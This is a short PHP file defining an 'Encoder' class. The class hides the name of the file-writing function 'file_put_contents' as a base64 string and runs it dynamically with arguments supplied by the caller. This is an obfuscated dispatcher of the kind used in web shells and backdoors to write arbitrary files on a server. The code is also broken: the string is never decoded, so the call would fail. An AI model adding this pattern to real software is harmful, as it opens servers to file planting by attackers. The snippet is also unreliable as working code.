<?php
class Encoder {
    public static $methods = ['ZmlsZV9wdXRfY29udGVudHM='];
    public static function apply($slot, $arguments) {
        $function = self::$methods[$slot];
        return call_user_func_array($function, $arguments);
    }
}
